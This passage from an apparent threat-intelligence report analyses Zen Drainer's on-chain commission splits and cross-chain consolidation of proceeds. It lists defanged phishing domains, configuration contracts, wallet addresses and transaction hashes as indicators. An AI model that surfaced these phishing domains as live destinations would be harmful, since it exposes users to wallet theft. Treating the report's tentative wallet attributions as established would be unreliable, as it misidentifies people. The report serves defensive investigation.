Following the initial manual investigation, an automated Python-based analysis pipeline was used to examine Ethereum transaction evidence associated with the commission address.
The pipeline combined Etherscan V2 transaction discovery with Ethereum RPC evidence collection and performed the following analytical steps:
1. Retrieved transaction data and ERC-20 transfer events.
2. Identified asset movements linked to the investigated commission address.
3. Reconstructed relevant source-to-recipient paths within individual transactions.
4. Grouped related transfers by transaction, asset and distribution path.
5. Calculated the proportional allocation of transferred assets between recipients.
6. Classified recognizable distribution patterns using a tolerance of ±1 percentage point.

The classification logic recognized three predefined distribution models: **80/20, 85/15 and 40/40/20**. Other distributions were retained separately.
The automated audit represented a separate analytical dataset from the initial Etherscan export. The two datasets had different selection scopes and partially overlapping transaction histories.

#### 6.2.3. Revenue Distribution Results

The resulting `affiliate_split_audit.csv` contained **106 unique Ethereum transaction hashes** associated with candidate commission distributions, covering the period from December 30, 2025, to October 25, 2026.

| Distribution pattern | Transactions |
| -------------------- | ------------ |
| 80/20                | 83           |
| 85/15                | 3            |
| 40/40/20             | 1            |
| OTHER                | 19           |
| **Total**            | **106**      |

![[Pasted image 20261109140924.png]]

**Figure 22.** Revenue distribution patterns identified during the preliminary Ethereum Mainnet transaction analysis.

Of the 106 transactions examined, **87 matched one of the three predefined revenue-sharing patterns**, with the 80/20 model accounting for the majority.

The three 85/15 transactions involved the same primary recipient address, indicating a recurring alternative distribution configuration within the examined dataset.

The single 40/40/20 transaction demonstrated a three-recipient distribution structure, while the 19 OTHER records did not match the predefined models within the configured tolerance.

These results are consistent with the presence of multiple revenue-sharing configurations. However, the observed ratios alone do not establish the identities of affiliates, the authorization status of transfers or the organizational relationships between recipients.

#### 6.2.4. Analytical Assessment

The Ethereum findings reinforce the revenue-sharing mechanism previously observed on Base.
The repeated appearance of structured asset distributions involving the identified commission wallet, together with Safe-based transaction execution, supports the assessment that automated commission allocation is a recurring component of the investigated infrastructure.
The dominance of the 80/20 pattern is consistent with the revenue-sharing model identified during the broader Zen Drainer investigation. The less frequent 85/15 and 40/40/20 patterns indicate additional observed configurations, although their specific operational purposes remain unverified.

**Scope and limitations:** The 106 transactions represent the classified output of the automated audit, not a complete inventory of all Ethereum activity involving Zen Drainer. The initial Etherscan filter produced 77 unique candidate transactions, of which 44 also appeared in the automated audit. These counts describe different datasets and must not be treated as a single discovery-to-classification funnel.

The findings establish observable on-chain distribution patterns rather than independently confirmed theft events or a definitive number of victims.
### 6.3. Recurring Proceeds Recipient — 85/15 Distribution Pattern

Further examination of the Ethereum transaction audit identified three operations classified under the 85/15 revenue-sharing model, dated July 21, July 28 and August 23, 2026.
All three records identified the same primary proceeds recipient:
`0xa72be0109274278762d044e609f64d486bf5d274`

| Date        | Transaction Hash                                                                                                                                                                          |
| ----------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 21 Jul 2026 | [`0x5f7d8cacc91e0512d3806ab7a86815f5d3276fda31ffb9da2182c871193b9a15`](https://etherscan.io/tx/0x5f7d8cacc91e0512d3806ab7a86815f5d3276fda31ffb9da2182c871193b9a15?utm_source=chatgpt.com) |
| 28 Jul 2026 | [`0x6a3d4cf73520dfad819867966cfbca439213aa033b3efc0bf087733ff37e077f`](https://etherscan.io/tx/0x6a3d4cf73520dfad819867966cfbca439213aa033b3efc0bf087733ff37e077f?utm_source=chatgpt.com) |
| 23 Aug 2026 | [`0x48e52da7da160f3801160de1917ea80beb6be1fd362e20bbf2d3ed2868eda206`](https://etherscan.io/tx/0x48e52da7da160f3801160de1917ea80beb6be1fd362e20bbf2d3ed2868eda206?utm_source=chatgpt.com) |

The recurrence of this address across separate transactions, combined with a consistent 85/15 distribution ratio, suggests a potentially recurring proceeds destination associated with the examined activity.
This pattern is also consistent with the alternative commission arrangement described in Zen Drainer promotional material, although the observed transactions do not independently establish the recipient's affiliate status.
External phishing-related address labels provide additional investigative context but are not sufficient to attribute the address to a specific operator, campaign or phishing domain.

**Assessment:** The address represents a relevant investigative pivot for examining potentially related transactions and infrastructure. Its controller and operational relationship with Zen Drainer remain unverified.
### 6.4. Financial Investigation Assessment

The combined Base and Ethereum analysis supports three principal findings:
1. **Recurring revenue distribution is observable on-chain.** Multiple examined transactions show structured asset allocation between primary proceeds recipients and the recurring Zen-associated commission address. The predominant 80/20 pattern is consistent with the service's advertised revenue-sharing arrangement.
2. **Different execution mechanisms can produce similar distribution outcomes.** The examined activity includes Safe/MultiSend-based execution, ERC-20 asset movements and, in a separately examined Ethereum transaction, Permit2-based transfers.
3. **The commission wallet provides a repeatable investigative pivot.** The recurring appearance of `zendrain[.]eth` enables transaction discovery, distribution-pattern comparison and identification of potentially related proceeds destinations across supported blockchain networks.

Taken together, these findings support the assessment that recurring on-chain commission allocation is consistent with the advertised Zen Drainer Drainer-as-a-Service model.
The analysis does not establish the operation's total financial impact, the number of distinct victims or the identities of the individuals controlling the recipient addresses.

### 6.5. Cross-Chain Asset Consolidation

A supplementary review of outgoing activity associated with the Zen Drainer commission wallet on Base identified substantial interactions with cross-chain bridging services.

The examined transaction history indicated approximately `$115,200` in outgoing volume, of which approximately `$92,747` was associated with bridge-related activity, according to the analytical platform's counterparty classifications.
Further examination using Symbiosis Explorer identified four successful Base-to-Ethereum transactions in which assets were transferred from the Zen-associated address on Base to the same address on Ethereum Mainnet.

|Date|Source asset (Base)|Destination asset (Ethereum)|
|---|---|---|
|21 May 2026|51,082.0794 USDC|50,921.4168 DAI|
|31 May 2026|2.0900 ETH|4,228.5045 DAI|
|11 Jun 2026|7.4869 WETH|11,941.6326 DAI|
|11 Jun 2026|5,131.4039 USDC|5,017.6669 DAI|

The May 21 cross-chain transfer was reconstructed using the source transaction on Base, the corresponding destination transaction on Ethereum, and the ERC-20 Transfer events confirming receipt of DAI.
The source transaction on Base (
`0x9e48cfc435602d240b75cc8cb2185cf819fb54a9662aab697fc7dd761b1677bd`) initiated the cross-chain transfer, while the corresponding Ethereum transaction (`0x33cb5ce416626a44a910a863c16b77191c090e3570774f925523c6c4aea6f73c`) recorded the final receipt of approximately 50,921.42 DAI at the Zen-associated address.

![[Pasted image 20261109172114.png|309]]

**Figure 23.** Symbiosis cross-chain transfer from Base to Ethereum, with DAI received by the same commission address.

Additional inspection of Relay bridge activity revealed a similar same-address transfer involving approximately 10,075.3 USDT converted into 10,074.9 DAI. The destination network and final settlement of this additional example require further transaction-level verification.
![[Pasted image 20261109172216.png]]

**Figure 24.** Relay cross-chain swap showing the same sender and recipient address.

**Assessment:** The observed Symbiosis transactions demonstrate repeated cross-chain movement and conversion of different assets into DAI on Ethereum Mainnet. Together with the preliminary Relay observation, this supports the hypothesis that Ethereum serves as a consolidation point for commission-related assets.

The subsequent disposition of the consolidated funds was not conclusively established. The observed bridge transfers should not be counted as additional revenue on top of the original incoming funds.
# 7. Technical Artifacts & Evidence Repository
## 7.1. Off-Chain Infrastructure and BSC Domain Configuration History

| Artifact                                   | Observed role / relevance                        | Evidence status |
| ------------------------------------------ | ------------------------------------------------ | --------------- |
| `https://yakkamon[.]web[.]app/?claimidref` | NFT-themed landing page; MONSTER NFT REVEAL lure | Observed        |
| `xunv[.]xyz/365f2332ff15701c52d2/`         | Iframe destination                               | Observed        |
| `fdar[.]xyz/365f2332ff15701c52d2/`         | Later iframe destination                         | Observed        |

**BSC configuration contract — `DomainUpdated` event history (UTC)**

| #   | Date (UTC)          | Recorded domain                  | Event transaction                                                                                                    |
| --- | ------------------- | -------------------------------- | -------------------------------------------------------------------------------------------------------------------- |
| 1   | 2026-02-12 0:33:11  | `zenzozo[.]xyz`                  | [`0xb9013c241e…4fcac306`](https://bscscan.com/tx/0xb9013c241ed090360ee29a5104994017fda0a6e782a318e49610cfd74fcac306) |
| 2   | 2026-06-28 15:33:31 | `zen[.]claims`                   | [`0x9880771526…417293aa`](https://bscscan.com/tx/0x988077152606a5d12c9f156d61c1384d1fec0309361e5d9098fa2b77417293aa) |
| 3   | 2026-09-08 1:44:41  | `zennnnnnn[.]xyz`                | [`0x108af57250…4474828b`](https://bscscan.com/tx/0x108af5725014642a3d6c5e3bd64482548cee567ffb6abb65b1e426934474828b) |
| 4   | 2026-09-21 18:18:30 | `zenzenzendrnzenzenzenzen[.]xyz` | [`0xbd64d17bf0…7ebebcca`](https://bscscan.com/tx/0xbd64d17bf015cd53848d8b707aa67b88520151b6619214faff6a04647ebebcca) |
| 5   | 2026-10-01 1:04:10  | `notzen[.]xyz`                   | [`0xa1a54a6fd4…3ea7eda2`](https://bscscan.com/tx/0xa1a54a6fd47159473a538ab6498a5927fc5f37e504d3abb6a90efc483ea7eda2) |
| 6   | 2026-10-01 16:46:53 | `zen-prepare-silk-chuckle[.]xyz` | [`0xbab25da9ce…f984a2e2`](https://bscscan.com/tx/0xbab25da9ce06f9251e041ec77fb154a50322d7c61ed60d82efbb51b9f984a2e2) |
| 7   | 2026-10-01 18:14:52 | `zen-onion-mouse-cave[.]xyz`     | [`0x2600b3c6b6…a7e53477`](https://bscscan.com/tx/0x2600b3c6b66871dfc388ae2339b0f89f9ed0dc27e1a8e2459a896e88a7e53477) |
| 8   | 2026-10-02 22:16:55 | `zen-latin-garage-juice[.]xyz`   | [`0x3c751edcd5…3ade68e0`](https://bscscan.com/tx/0x3c751edcd5e978cb08f3454b7384b4cad161f89c593b97db335e0ca33ade68e0) |
| 9   | 2026-10-05 2:23:57  | `zen-civil-sibling-puppy[.]xyz`  | [`0x1a331876bb…d5102d27`](https://bscscan.com/tx/0x1a331876bbf2a335f25d3436249b8598ce7b18c64e411e3193b01407d5102d27) |
| 10  | 2026-10-05 16:53:06 | `zen-earth-pistol-alpha[.]xyz`   | [`0x21dbaaecf0…c7989917`](https://bscscan.com/tx/0x21dbaaecf0a42de380b033cd1cb40371fffa4848c599bc8635d5db75c7989917) |
| 11  | 2026-10-07 19:00:31 | `zen-rough-bitter-steel[.]xyz`   | [`0xd1157e51d0…97ed4b04`](https://bscscan.com/tx/0xd1157e51d0b19fecdfa784d067a7f0981cf8ef2405884a0bae62294d97ed4b04) |
| 12  | 2026-10-15 15:06:47 | `zen-agent-oil-comic[.]xyz`      | [`0x9fa8fdd942…0f05a4fd`](https://bscscan.com/tx/0x9fa8fdd9421a51e4f8dae0734f5f0ab908c74ac7c78d35a83585c8400f05a4fd) |
| 13  | 2026-10-19 1:31:59  | `zen-ignore-tree-include[.]xyz`  | [`0x3424a26c7b…df2fd807`](https://bscscan.com/tx/0x3424a26c7b66c7f90ae209ca92674861c9d186cf8b9d1162c68b191bdf2fd807) |
| 14  | 2026-10-24 1:02:01  | `zen-name-tide-fee[.]xyz`        | [`0xebe60ae949…d5991fd1`](https://bscscan.com/tx/0xebe60ae9497c288eacbf25ed0dbfd6f644dccba39e0081f7297d884fd5991fd1) |
| 15  | 2026-10-24 5:11:19  | `zen-video-arrest-monster[.]xyz` | [`0x8a5ca6e735…1e9e9655`](https://bscscan.com/tx/0x8a5ca6e735073286254b1d6f990efd7bcf6fd1b5eee80db9bb763d5c1e9e9655) |
| 16  | 2026-10-27 17:45:02 | `zen-castle-depth-gas[.]xyz`     | [`0xdc2ae5489a…e7c5a2e1`](https://bscscan.com/tx/0xdc2ae5489a3816f63914af3ee66cad0f80b36273f9a72ac93604692ee7c5a2e1) |
| 17  | 2026-11-06 12:36:50 | `zen-stand-blossom-hello[.]xyz`  | [`0xb7c72a6e2b…6b561bbf`](https://bscscan.com/tx/0xb7c72a6e2b394148093ac24afdf92fbd7632a709a01bb60443afe8166b561bbf) |



> Figure 18 covers 16 events through 27 October 2026; the export adds a 17th event dated 6 November 2026. Event values are historical contract settings, not verified live endpoints.

## 7.2. Smart Contracts and Execution Infrastructure

|Network|Contract / address|Technical role|
|---|---|---|
|BNB Smart Chain|[`0x1AC7d768E37B147c993dE943D704c4e92d7861A1`](https://bscscan.com/address/0x1AC7d768E37B147c993dE943D704c4e92d7861A1)|On-chain configuration / backend resolver examined in the loader workflow|
|BNB Smart Chain|[`0xb88eCA7852A5e9b63fEB85f229a3B4a1D5064A1A`](https://bscscan.com/address/0xb88eCA7852A5e9b63fEB85f229a3B4a1D5064A1A)|Identified configuration-contract deployer|
|Base|[`0xc25Ee26FC3b62222481765f2732821e2F6344875`](https://basescan.org/address/0xc25Ee26FC3b62222481765f2732821e2F6344875)|SafeProxy used in six reconstructed distribution operations|
|Base|[`0x86C1BacD79c19d1Febfb933CEfBa2821F81a0030`](https://basescan.org/address/0x86C1BacD79c19d1Febfb933CEfBa2821F81a0030)|Additional examined SafeProxy|
|Base|[`0xf5478e3876CA0b2E778BDb2A7661679fd15Cb5B3`](https://basescan.org/address/0xf5478e3876CA0b2E778BDb2A7661679fd15Cb5B3)|Additional examined SafeProxy|
|EVM execution examples|[`0xA238CBeb142c10Ef7Ad8442C6D1f9E89e07e7761`](https://etherscan.io/address/0xA238CBeb142c10Ef7Ad8442C6D1f9E89e07e7761)|MultiSend contract used in examined execution paths|
|Ethereum|[`0x17A4e8f8A437F18624730146A7978685824F2DEA`](https://etherscan.io/address/0x17A4e8f8A437F18624730146A7978685824F2DEA)|Safe involved in the separately reconstructed Permit2 example|

> The three Base contracts above are representative of 19 SafeProxy candidates identified in the examined dataset.

## 7.3. Wallet and Address Indicators

|Address|Role in the examined evidence|Interpretation|
|---|---|---|
|[`0xF49d21C1De07706808df9b57d8AA65129cCA044d`](https://etherscan.io/address/0xF49d21C1De07706808df9b57d8AA65129cCA044d)|`zendrain[.]eth`; recurring recipient of ~20% allocations; cross-chain sender/recipient|Zen-associated commission wallet; operator identity not established|
|[`0x5aceB19ccc546b8ed39d763e764364115bdfb21a`](https://basescan.org/address/0x5aceB19ccc546b8ed39d763e764364115bdfb21a)|Initiator of six examined Base SafeProxy executions|Execution role, not independently attributed operator|
|[`0x51873d975715e6F5076442cDE47B10e9669fFD16`](https://basescan.org/address/0x51873d975715e6F5076442cDE47B10e9669fFD16)|Token source in FLOWER reconstruction|Candidate affected wallet; context-dependent victim assessment|
|[`0x2B1E3a43C728e7A43804aC153B79717C5881e1c6`](https://basescan.org/address/0x2B1E3a43C728e7A43804aC153B79717C5881e1c6)|Primary FLOWER recipient|Transaction-level proceeds recipient|
|[`0xa72be0109274278762d044e609f64d486bf5d274`](https://etherscan.io/address/0xa72be0109274278762d044e609f64d486bf5d274)|Recurring 85% recipient in three Ethereum transactions|Potential shared proceeds destination; affiliate status not established|
|[`0xe1ef9316b9CECb2a1DDaa3d7FADBA5BBA99BF7b6`](https://etherscan.io/address/0xe1ef9316b9CECb2a1DDaa3d7FADBA5BBA99BF7b6)|Token owner in examined Ethereum Permit2 transaction|Source role; not sufficient alone to prove compromise|
|[`0xB4fB46c6Da50401205FEa5326309B98BA61Ea711`](https://etherscan.io/address/0xB4fB46c6Da50401205FEa5326309B98BA61Ea711)|Primary recipient in examined Ethereum Permit2 transaction|Transaction-level proceeds recipient|

## 7.4. Representative Transaction Evidence

|Network|Transaction|Relevance|
|---|---|---|
|Base|[`0xe58fced64c0f4fede2b8ffe59b0cd04c0de83eef52e4ce99018edada71e0d81f`](https://basescan.org/tx/0xe58fced64c0f4fede2b8ffe59b0cd04c0de83eef52e4ce99018edada71e0d81f)|FLOWER distribution via Safe/MultiSend|
|Base|[`0xb739cd0c861d1fdd3b58a8486f901ed0742134cac408ceda38c409a9632eaec0`](https://basescan.org/tx/0xb739cd0c861d1fdd3b58a8486f901ed0742134cac408ceda38c409a9632eaec0)|Additional ERC-20 split in the six-operation sample|
|Base|[`0x5a07ea1f639e9c5ae59c67d52397148e6d0c0755566801ee6e1e42f64e359236`](https://basescan.org/tx/0x5a07ea1f639e9c5ae59c67d52397148e6d0c0755566801ee6e1e42f64e359236)|Native ETH 80/20 distribution|
|Base|[`0x3ce2440ff43331905e9cead5d690a1737f1ddcbe7a822c23db300155b3fcec16`](https://basescan.org/tx/0x3ce2440ff43331905e9cead5d690a1737f1ddcbe7a822c23db300155b3fcec16)|Native ETH 80/20 distribution|
|Base|[`0x04a6076dcd53632af7f9476c6a7bc7ea1955f84cb6492ca6970db73705ad45c8`](https://basescan.org/tx/0x04a6076dcd53632af7f9476c6a7bc7ea1955f84cb6492ca6970db73705ad45c8)|Native ETH 80/20 distribution|
|Base|[`0xe4d23072504be414e63930763be651de0c6578f252e07cc25cfa81c75a3b1513`](https://basescan.org/tx/0xe4d23072504be414e63930763be651de0c6578f252e07cc25cfa81c75a3b1513)|Native ETH 80/20 distribution|
|Ethereum|[`0x8fd41e408a0b2ffbbdb8d66e096a726823ba02cab48cca566f722d4cb62360f9`](https://etherscan.io/tx/0x8fd41e408a0b2ffbbdb8d66e096a726823ba02cab48cca566f722d4cb62360f9)|Safe/MultiSend/Permit2 execution|
|Ethereum|[`0x5f7d8cacc91e0512d3806ab7a86815f5d3276fda31ffb9da2182c871193b9a15`](https://etherscan.io/tx/0x5f7d8cacc91e0512d3806ab7a86815f5d3276fda31ffb9da2182c871193b9a15)|85/15 classification, 21 July 2026|
|Ethereum|[`0x6a3d4cf73520dfad819867966cfbca439213aa033b3efc0bf087733ff37e077f`](https://etherscan.io/tx/0x6a3d4cf73520dfad819867966cfbca439213aa033b3efc0bf087733ff37e077f)|85/15 classification, 28 July 2026|
|Ethereum|[`0x48e52da7da160f3801160de1917ea80beb6be1fd362e20bbf2d3ed2868eda206`](https://etherscan.io/tx/0x48e52da7da160f3801160de1917ea80beb6be1fd362e20bbf2d3ed2868eda206)|85/15 classification, 23 August 2026|

**Cross-chain pairs (Symbiosis, Base → Ethereum):**

|Date|Base source transaction|Ethereum destination transaction|Asset conversion|
|---|---|---|---|
|21 May 2026|[`0x9e48cfc435…761b1677bd`](https://basescan.org/tx/0x9e48cfc435602d240b75cc8cb2185cf819fb54a9662aab697fc7dd761b1677bd)|[`0x33cb5ce416…4aea6f73c`](https://etherscan.io/tx/0x33cb5ce416626a44a910a863c16b77191c090e3570774f925523c6c4aea6f73c)|51,082.0794 USDC → 50,921.4168 DAI|
|31 May 2026|[`0x3ea2c7a66f…272c3443b`](https://basescan.org/tx/0x3ea2c7a66f2c9e8a402ae87aad0fd0f75194f8724b7fb42d11b68bc272c3443b)|Destination hash retained in bridge screenshot; full value not transcribed|2.0900 ETH → 4,228.5045 DAI|
|11 Jun 2026|[`0x85526e86ed…628330b`](https://basescan.org/tx/0x85526e86ed4476155f7de6b9ae809d946632ba2ed63a8fb1a25e435ae628330b)|Destination hash retained in bridge screenshot; full value not transcribed|7.4869 WETH → 11,941.6326 DAI|
|11 Jun 2026|[`0xeb07d110b5…3124f09`](https://basescan.org/tx/0xeb07d110b57f882eb5b4f87de588490d1358434462bebe14a1e80a9103124f09)|Destination hash retained in bridge screenshot; full value not transcribed|5,131.4039 USDC → 5,017.6669 DAI|

**Additional bridge observation**

|Bridge|Source → destination assets|Address relationship|Evidence|
|---|---|---|---|
|Relay|10,075.3 USDT → 10,074.9 DAI|Same displayed sender and recipient (`zendrain[.]eth`)|Explorer screenshot; destination settlement not independently checked|
